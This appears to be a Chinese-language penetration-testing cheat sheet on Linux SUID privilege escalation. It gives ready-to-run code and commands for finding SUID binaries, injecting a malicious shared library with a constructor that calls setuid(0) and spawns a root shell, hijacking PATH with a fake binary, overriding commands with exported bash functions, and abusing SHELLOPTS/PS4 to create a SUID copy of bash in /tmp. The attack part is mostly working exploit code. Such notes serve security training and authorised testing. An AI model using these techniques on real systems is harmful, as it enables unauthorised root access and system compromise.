```bash
find / -perm -u=s -type f 2>/dev/null # 查找有SUID权限的文件
```

# 可执行文件已知漏洞

用searchsploit对SUID可执行文件进行搜集，查看可利用的漏洞

# 共享库注入

对有SUID权限的文件进行分析，如果有报错的内容表面这个文件请求了一个共享库，那么可以伪造共享库注入提权代码

```bash
strings <file>
strace <file> 2>&1
```

```bash
# file: pri.c

#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor)); # 共享库被加载时会自动执行这个函数

void inject() {
		setgid(0);
		setuid(0);
		system("/bin/bash -p");
}
```

```bash
gcc -fPIC -shared -o <file.so> <file.c>
```

在C语言中，`__attribute__((constructor))` 是一个特殊的属性，它用于指定一个函数在程序运行时的初始化阶段被自动调用。具体来说，当程序加载时，具有此属性的函数会在 main() 函数执行之前被自动调用。这个特性通常用于执行一些全局初始化操作，例如初始化全局变量、打开文件、建立连接等。
另外，还有一个对应的 `__attribute((destructor))__` 属性，它让系统在 main() 函数退出或者调用了 exit() 之后，调用我们的函数。带有这些修饰属性的函数，对于我们初始化一些在程序中使用的数据非常有用。

# 环境变量利用

对有SUID权限的文件进行分析(strings strace)，如果里面有相对路径的命令文件，利用PATH环境变量，则可以伪造文件注入提权代码

```bash
#include <stdio.h>
#include <stdlib.h>

void main() {
		setgid(0);
		setuid(0);
		system("/bin/bash -p");
}
```

```bash
export PATH=.:$PATH # 使得当前目录下的文件优先执行
gcc -o <file> <file.c>
/suid-file
```

# SUID-Shell功能

## (1) bash version < 4.2

bash在执行的时候，对于自身定义的函数优先级高于环境变量（类似于环境变量覆盖，用更高优先级的环境变量劫持掉这个命令，注入提权代码

在 Bash 版本小于 4.2 的情况下，可以使用路径的组合作为函数的名称来定义函数。这意味着可以使用像文件路径一样的字符串来命名你的函数。例如，你可以定义一个名为 **`dir/subdir/myfunc`** 的函数。然后，你可以通过 **`dir/subdir/myfunc`** 来调用这个函数。

```bash
strings <file>
# /usr/bin/service apache2 start

function /usr/bin/service { /bin/bash -p; }
export -f /usr/bin/service
<file>
```

## (2) bash version < 4.4

bash版本低于4.4的时候，调试模式，对bash的环境变量进行设置

```bash
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash;chmod +xs /tmp/rootbash)' /usr/bin/<file>
```

- `env -i`：这个命令会创建一个新的环境，并在这个新环境中运行后面的命令。新环境中不包含任何原来的环境变量。
- `SHELLOPTS=xtrace`：这个命令会设置 SHELLOPTS 环境变量的值为 xtrace。xtrace 是 Bash 的一个选项，当它被设置时，Bash 会打印出每一条执行的命令。这对于调试脚本非常有用。
- `PS4='$(cp /bin/bash /tmp/rootbash;chmod +xs /tmp/rootbash)'`：这个命令会设置 PS4 环境变量的值为 '$(cp /bin/bash /tmp/rootbash;chmod +xs /tmp/rootbash)'。PS4 是 Bash 的一个特殊变量，它定义了在 xtrace 模式下每一条命令执行前打印的提示符。在这个例子中，我们将提示符设置为一个命令，这个命令会复制 /bin/bash 到 /tmp/rootbash，并给 /tmp/rootbash 设置 SUID 和可执行权限。